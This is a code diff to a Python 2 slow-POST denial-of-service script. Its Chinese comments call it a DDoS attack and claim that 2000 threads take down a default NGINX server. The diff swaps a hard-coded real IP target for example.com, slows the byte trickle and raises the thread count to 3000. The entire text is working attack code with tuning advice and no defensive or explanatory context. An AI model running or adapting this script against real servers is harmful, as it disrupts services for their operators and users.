@@ -19,7 +19,7 @@ class DDOS(Thread):
 
     def ddos(self):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        host = '121.40.78.16'  # DDOS攻击地址
+        host = 'www.example.com'  # DDOS攻击地址, 可以是IP或者域名
         sock.connect((host, 80))
         sock.send(
             'POST / HTTP/1.1\r\n' +
@@ -34,13 +34,13 @@ class DDOS(Thread):
         )
         sock.send('Cookie: user=Alex+Porter\r\n\r\n')
         while True:  # 以非常慢的速度发送数据
-            time.sleep(10)
             sock.send('z')
+            time.sleep(120)
         print sock.recv(1024)
         sock.close()
 
 
 arr = []
-for i in range(2000):  # range中设置攻击的线程数量, 2000的线程就可以拖垮默认配置的NGINX服务器(响应500).
+for i in range(3000):  # range中设置攻击的线程数量, 2000的线程就可以拖垮默认配置的NGINX服务器(响应500).
     arr.append(DDOS())
     arr[i].start()
